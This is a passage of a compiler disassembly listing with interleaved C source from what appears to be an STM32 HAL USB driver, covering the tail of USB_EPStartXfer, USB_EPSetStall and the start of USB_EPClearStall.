 8007f6a:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007f6e:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007f72:	2b00      	cmp	r3, #0
 8007f74:	f040 81ee 	bne.w	8008354 <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007f78:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f7c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f80:	681a      	ldr	r2, [r3, #0]
 8007f82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f86:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f8a:	681b      	ldr	r3, [r3, #0]
 8007f8c:	781b      	ldrb	r3, [r3, #0]
 8007f8e:	009b      	lsls	r3, r3, #2
 8007f90:	4413      	add	r3, r2
 8007f92:	881b      	ldrh	r3, [r3, #0]
 8007f94:	b29b      	uxth	r3, r3
 8007f96:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007f9a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007f9e:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007fa2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fa6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007faa:	681a      	ldr	r2, [r3, #0]
 8007fac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fb0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fb4:	681b      	ldr	r3, [r3, #0]
 8007fb6:	781b      	ldrb	r3, [r3, #0]
 8007fb8:	009b      	lsls	r3, r3, #2
 8007fba:	441a      	add	r2, r3
 8007fbc:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8007fc0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007fc4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007fc8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007fcc:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8007fd0:	b29b      	uxth	r3, r3
 8007fd2:	8013      	strh	r3, [r2, #0]
 8007fd4:	e1be      	b.n	8008354 <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 8007fd6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fda:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fde:	681b      	ldr	r3, [r3, #0]
 8007fe0:	78db      	ldrb	r3, [r3, #3]
 8007fe2:	2b01      	cmp	r3, #1
 8007fe4:	f040 81b4 	bne.w	8008350 <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8007fe8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ff0:	681b      	ldr	r3, [r3, #0]
 8007ff2:	699a      	ldr	r2, [r3, #24]
 8007ff4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ff8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ffc:	681b      	ldr	r3, [r3, #0]
 8007ffe:	691b      	ldr	r3, [r3, #16]
 8008000:	429a      	cmp	r2, r3
 8008002:	d917      	bls.n	8008034 <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
 8008004:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008008:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800800c:	681b      	ldr	r3, [r3, #0]
 800800e:	691b      	ldr	r3, [r3, #16]
 8008010:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 8008014:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008018:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800801c:	681b      	ldr	r3, [r3, #0]
 800801e:	699a      	ldr	r2, [r3, #24]
 8008020:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008024:	1ad2      	subs	r2, r2, r3
 8008026:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800802a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800802e:	681b      	ldr	r3, [r3, #0]
 8008030:	619a      	str	r2, [r3, #24]
 8008032:	e00e      	b.n	8008052 <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 8008034:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008038:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800803c:	681b      	ldr	r3, [r3, #0]
 800803e:	699b      	ldr	r3, [r3, #24]
 8008040:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 8008044:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008048:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800804c:	681b      	ldr	r3, [r3, #0]
 800804e:	2200      	movs	r2, #0
 8008050:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 8008052:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008056:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800805a:	681b      	ldr	r3, [r3, #0]
 800805c:	785b      	ldrb	r3, [r3, #1]
 800805e:	2b00      	cmp	r3, #0
 8008060:	f040 8085 	bne.w	800816e <USB_EPStartXfer+0x14fc>
 8008064:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008068:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800806c:	681b      	ldr	r3, [r3, #0]
 800806e:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8008072:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008076:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800807a:	681b      	ldr	r3, [r3, #0]
 800807c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008080:	b29b      	uxth	r3, r3
 8008082:	461a      	mov	r2, r3
 8008084:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8008088:	4413      	add	r3, r2
 800808a:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 800808e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008092:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008096:	681b      	ldr	r3, [r3, #0]
 8008098:	781b      	ldrb	r3, [r3, #0]
 800809a:	00da      	lsls	r2, r3, #3
 800809c:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 80080a0:	4413      	add	r3, r2
 80080a2:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80080a6:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 80080aa:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080ae:	881b      	ldrh	r3, [r3, #0]
 80080b0:	b29b      	uxth	r3, r3
 80080b2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80080b6:	b29a      	uxth	r2, r3
 80080b8:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080bc:	801a      	strh	r2, [r3, #0]
 80080be:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080c2:	2b3e      	cmp	r3, #62	; 0x3e
 80080c4:	d923      	bls.n	800810e <USB_EPStartXfer+0x149c>
 80080c6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080ca:	095b      	lsrs	r3, r3, #5
 80080cc:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 80080d0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080d4:	f003 031f 	and.w	r3, r3, #31
 80080d8:	2b00      	cmp	r3, #0
 80080da:	d104      	bne.n	80080e6 <USB_EPStartXfer+0x1474>
 80080dc:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 80080e0:	3b01      	subs	r3, #1
 80080e2:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 80080e6:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080ea:	881b      	ldrh	r3, [r3, #0]
 80080ec:	b29a      	uxth	r2, r3
 80080ee:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 80080f2:	b29b      	uxth	r3, r3
 80080f4:	029b      	lsls	r3, r3, #10
 80080f6:	b29b      	uxth	r3, r3
 80080f8:	4313      	orrs	r3, r2
 80080fa:	b29b      	uxth	r3, r3
 80080fc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008100:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008104:	b29a      	uxth	r2, r3
 8008106:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 800810a:	801a      	strh	r2, [r3, #0]
 800810c:	e060      	b.n	80081d0 <USB_EPStartXfer+0x155e>
 800810e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008112:	2b00      	cmp	r3, #0
 8008114:	d10c      	bne.n	8008130 <USB_EPStartXfer+0x14be>
 8008116:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 800811a:	881b      	ldrh	r3, [r3, #0]
 800811c:	b29b      	uxth	r3, r3
 800811e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008122:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008126:	b29a      	uxth	r2, r3
 8008128:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 800812c:	801a      	strh	r2, [r3, #0]
 800812e:	e04f      	b.n	80081d0 <USB_EPStartXfer+0x155e>
 8008130:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008134:	085b      	lsrs	r3, r3, #1
 8008136:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 800813a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800813e:	f003 0301 	and.w	r3, r3, #1
 8008142:	2b00      	cmp	r3, #0
 8008144:	d004      	beq.n	8008150 <USB_EPStartXfer+0x14de>
 8008146:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 800814a:	3301      	adds	r3, #1
 800814c:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8008150:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8008154:	881b      	ldrh	r3, [r3, #0]
 8008156:	b29a      	uxth	r2, r3
 8008158:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 800815c:	b29b      	uxth	r3, r3
 800815e:	029b      	lsls	r3, r3, #10
 8008160:	b29b      	uxth	r3, r3
 8008162:	4313      	orrs	r3, r2
 8008164:	b29a      	uxth	r2, r3
 8008166:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 800816a:	801a      	strh	r2, [r3, #0]
 800816c:	e030      	b.n	80081d0 <USB_EPStartXfer+0x155e>
 800816e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008172:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008176:	681b      	ldr	r3, [r3, #0]
 8008178:	785b      	ldrb	r3, [r3, #1]
 800817a:	2b01      	cmp	r3, #1
 800817c:	d128      	bne.n	80081d0 <USB_EPStartXfer+0x155e>
 800817e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008182:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008186:	681b      	ldr	r3, [r3, #0]
 8008188:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 800818c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008190:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008194:	681b      	ldr	r3, [r3, #0]
 8008196:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800819a:	b29b      	uxth	r3, r3
 800819c:	461a      	mov	r2, r3
 800819e:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 80081a2:	4413      	add	r3, r2
 80081a4:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 80081a8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081ac:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80081b0:	681b      	ldr	r3, [r3, #0]
 80081b2:	781b      	ldrb	r3, [r3, #0]
 80081b4:	00da      	lsls	r2, r3, #3
 80081b6:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 80081ba:	4413      	add	r3, r2
 80081bc:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80081c0:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 80081c4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80081c8:	b29a      	uxth	r2, r3
 80081ca:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 80081ce:	801a      	strh	r2, [r3, #0]
 80081d0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081d4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80081d8:	681b      	ldr	r3, [r3, #0]
 80081da:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 80081de:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081e2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80081e6:	681b      	ldr	r3, [r3, #0]
 80081e8:	785b      	ldrb	r3, [r3, #1]
 80081ea:	2b00      	cmp	r3, #0
 80081ec:	f040 8085 	bne.w	80082fa <USB_EPStartXfer+0x1688>
 80081f0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80081f4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80081f8:	681b      	ldr	r3, [r3, #0]
 80081fa:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 80081fe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008202:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008206:	681b      	ldr	r3, [r3, #0]
 8008208:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800820c:	b29b      	uxth	r3, r3
 800820e:	461a      	mov	r2, r3
 8008210:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8008214:	4413      	add	r3, r2
 8008216:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 800821a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800821e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008222:	681b      	ldr	r3, [r3, #0]
 8008224:	781b      	ldrb	r3, [r3, #0]
 8008226:	00da      	lsls	r2, r3, #3
 8008228:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 800822c:	4413      	add	r3, r2
 800822e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8008232:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 8008236:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800823a:	881b      	ldrh	r3, [r3, #0]
 800823c:	b29b      	uxth	r3, r3
 800823e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8008242:	b29a      	uxth	r2, r3
 8008244:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008248:	801a      	strh	r2, [r3, #0]
 800824a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800824e:	2b3e      	cmp	r3, #62	; 0x3e
 8008250:	d923      	bls.n	800829a <USB_EPStartXfer+0x1628>
 8008252:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008256:	095b      	lsrs	r3, r3, #5
 8008258:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 800825c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008260:	f003 031f 	and.w	r3, r3, #31
 8008264:	2b00      	cmp	r3, #0
 8008266:	d104      	bne.n	8008272 <USB_EPStartXfer+0x1600>
 8008268:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 800826c:	3b01      	subs	r3, #1
 800826e:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008272:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008276:	881b      	ldrh	r3, [r3, #0]
 8008278:	b29a      	uxth	r2, r3
 800827a:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 800827e:	b29b      	uxth	r3, r3
 8008280:	029b      	lsls	r3, r3, #10
 8008282:	b29b      	uxth	r3, r3
 8008284:	4313      	orrs	r3, r2
 8008286:	b29b      	uxth	r3, r3
 8008288:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800828c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008290:	b29a      	uxth	r2, r3
 8008292:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008296:	801a      	strh	r2, [r3, #0]
 8008298:	e05c      	b.n	8008354 <USB_EPStartXfer+0x16e2>
 800829a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800829e:	2b00      	cmp	r3, #0
 80082a0:	d10c      	bne.n	80082bc <USB_EPStartXfer+0x164a>
 80082a2:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80082a6:	881b      	ldrh	r3, [r3, #0]
 80082a8:	b29b      	uxth	r3, r3
 80082aa:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80082ae:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80082b2:	b29a      	uxth	r2, r3
 80082b4:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80082b8:	801a      	strh	r2, [r3, #0]
 80082ba:	e04b      	b.n	8008354 <USB_EPStartXfer+0x16e2>
 80082bc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80082c0:	085b      	lsrs	r3, r3, #1
 80082c2:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80082c6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80082ca:	f003 0301 	and.w	r3, r3, #1
 80082ce:	2b00      	cmp	r3, #0
 80082d0:	d004      	beq.n	80082dc <USB_EPStartXfer+0x166a>
 80082d2:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80082d6:	3301      	adds	r3, #1
 80082d8:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80082dc:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80082e0:	881b      	ldrh	r3, [r3, #0]
 80082e2:	b29a      	uxth	r2, r3
 80082e4:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80082e8:	b29b      	uxth	r3, r3
 80082ea:	029b      	lsls	r3, r3, #10
 80082ec:	b29b      	uxth	r3, r3
 80082ee:	4313      	orrs	r3, r2
 80082f0:	b29a      	uxth	r2, r3
 80082f2:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80082f6:	801a      	strh	r2, [r3, #0]
 80082f8:	e02c      	b.n	8008354 <USB_EPStartXfer+0x16e2>
 80082fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80082fe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008302:	681b      	ldr	r3, [r3, #0]
 8008304:	785b      	ldrb	r3, [r3, #1]
 8008306:	2b01      	cmp	r3, #1
 8008308:	d124      	bne.n	8008354 <USB_EPStartXfer+0x16e2>
 800830a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800830e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008312:	681b      	ldr	r3, [r3, #0]
 8008314:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008318:	b29b      	uxth	r3, r3
 800831a:	461a      	mov	r2, r3
 800831c:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 8008320:	4413      	add	r3, r2
 8008322:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 8008326:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800832a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800832e:	681b      	ldr	r3, [r3, #0]
 8008330:	781b      	ldrb	r3, [r3, #0]
 8008332:	00da      	lsls	r2, r3, #3
 8008334:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 8008338:	4413      	add	r3, r2
 800833a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800833e:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 8008342:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008346:	b29a      	uxth	r2, r3
 8008348:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 800834c:	801a      	strh	r2, [r3, #0]
 800834e:	e001      	b.n	8008354 <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 8008350:	2301      	movs	r3, #1
 8008352:	e03a      	b.n	80083ca <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8008354:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008358:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800835c:	681a      	ldr	r2, [r3, #0]
 800835e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008362:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008366:	681b      	ldr	r3, [r3, #0]
 8008368:	781b      	ldrb	r3, [r3, #0]
 800836a:	009b      	lsls	r3, r3, #2
 800836c:	4413      	add	r3, r2
 800836e:	881b      	ldrh	r3, [r3, #0]
 8008370:	b29b      	uxth	r3, r3
 8008372:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8008376:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800837a:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800837e:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008382:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8008386:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800838a:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800838e:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8008392:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008396:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800839a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800839e:	681a      	ldr	r2, [r3, #0]
 80083a0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80083a4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80083a8:	681b      	ldr	r3, [r3, #0]
 80083aa:	781b      	ldrb	r3, [r3, #0]
 80083ac:	009b      	lsls	r3, r3, #2
 80083ae:	441a      	add	r2, r3
 80083b0:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80083b4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80083b8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80083bc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80083c0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80083c4:	b29b      	uxth	r3, r3
 80083c6:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 80083c8:	2300      	movs	r3, #0
}
 80083ca:	4618      	mov	r0, r3
 80083cc:	f507 7784 	add.w	r7, r7, #264	; 0x108
 80083d0:	46bd      	mov	sp, r7
 80083d2:	bd80      	pop	{r7, pc}

080083d4 <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80083d4:	b480      	push	{r7}
 80083d6:	b085      	sub	sp, #20
 80083d8:	af00      	add	r7, sp, #0
 80083da:	6078      	str	r0, [r7, #4]
 80083dc:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 80083de:	683b      	ldr	r3, [r7, #0]
 80083e0:	785b      	ldrb	r3, [r3, #1]
 80083e2:	2b00      	cmp	r3, #0
 80083e4:	d020      	beq.n	8008428 <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 80083e6:	687a      	ldr	r2, [r7, #4]
 80083e8:	683b      	ldr	r3, [r7, #0]
 80083ea:	781b      	ldrb	r3, [r3, #0]
 80083ec:	009b      	lsls	r3, r3, #2
 80083ee:	4413      	add	r3, r2
 80083f0:	881b      	ldrh	r3, [r3, #0]
 80083f2:	b29b      	uxth	r3, r3
 80083f4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80083f8:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80083fc:	81bb      	strh	r3, [r7, #12]
 80083fe:	89bb      	ldrh	r3, [r7, #12]
 8008400:	f083 0310 	eor.w	r3, r3, #16
 8008404:	81bb      	strh	r3, [r7, #12]
 8008406:	687a      	ldr	r2, [r7, #4]
 8008408:	683b      	ldr	r3, [r7, #0]
 800840a:	781b      	ldrb	r3, [r3, #0]
 800840c:	009b      	lsls	r3, r3, #2
 800840e:	441a      	add	r2, r3
 8008410:	89bb      	ldrh	r3, [r7, #12]
 8008412:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008416:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800841a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800841e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008422:	b29b      	uxth	r3, r3
 8008424:	8013      	strh	r3, [r2, #0]
 8008426:	e01f      	b.n	8008468 <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 8008428:	687a      	ldr	r2, [r7, #4]
 800842a:	683b      	ldr	r3, [r7, #0]
 800842c:	781b      	ldrb	r3, [r3, #0]
 800842e:	009b      	lsls	r3, r3, #2
 8008430:	4413      	add	r3, r2
 8008432:	881b      	ldrh	r3, [r3, #0]
 8008434:	b29b      	uxth	r3, r3
 8008436:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800843a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800843e:	81fb      	strh	r3, [r7, #14]
 8008440:	89fb      	ldrh	r3, [r7, #14]
 8008442:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8008446:	81fb      	strh	r3, [r7, #14]
 8008448:	687a      	ldr	r2, [r7, #4]
 800844a:	683b      	ldr	r3, [r7, #0]
 800844c:	781b      	ldrb	r3, [r3, #0]
 800844e:	009b      	lsls	r3, r3, #2
 8008450:	441a      	add	r2, r3
 8008452:	89fb      	ldrh	r3, [r7, #14]
 8008454:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008458:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800845c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008460:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008464:	b29b      	uxth	r3, r3
 8008466:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008468:	2300      	movs	r3, #0
}
 800846a:	4618      	mov	r0, r3
 800846c:	3714      	adds	r7, #20
 800846e:	46bd      	mov	sp, r7
 8008470:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008474:	4770      	bx	lr

08008476 <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8008476:	b480      	push	{r7}
 8008478:	b087      	sub	sp, #28
 800847a:	af00      	add	r7, sp, #0
 800847c:	6078      	str	r0, [r7, #4]
 800847e:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 8008480:	683b      	ldr	r3, [r7, #0]
 8008482:	7b1b      	ldrb	r3, [r3, #12]
 8008484:	2b00      	cmp	r3, #0
 8008486:	f040 809d 	bne.w	80085c4 <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 800848a:	683b      	ldr	r3, [r7, #0]
 800848c:	785b      	ldrb	r3, [r3, #1]
 800848e:	2b00      	cmp	r3, #0
 8008490:	d04c      	beq.n	800852c <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8008492:	687a      	ldr	r2, [r7, #4]
 8008494:	683b      	ldr	r3, [r7, #0]
 8008496:	781b      	ldrb	r3, [r3, #0]
 8008498:	009b      	lsls	r3, r3, #2
 800849a:	4413      	add	r3, r2
 800849c:	881b      	ldrh	r3, [r3, #0]
 800849e:	823b      	strh	r3, [r7, #16]
 80084a0:	8a3b      	ldrh	r3, [r7, #16]
 80084a2:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80084a6:	2b00      	cmp	r3, #0
 80084a8:	d01b      	beq.n	80084e2 <USB_EPClearStall+0x6c>
 80084aa:	687a      	ldr	r2, [r7, #4]
 80084ac:	683b      	ldr	r3, [r7, #0]
 80084ae:	781b      	ldrb	r3, [r3, #0]
 80084b0:	009b      	lsls	r3, r3, #2
 80084b2:	4413      	add	r3, r2
 80084b4:	881b      	ldrh	r3, [r3, #0]
 80084b6:	b29b      	uxth	r3, r3
 80084b8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80084bc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80084c0:	81fb      	strh	r3, [r7, #14]
 80084c2:	687a      	ldr	r2, [r7, #4]
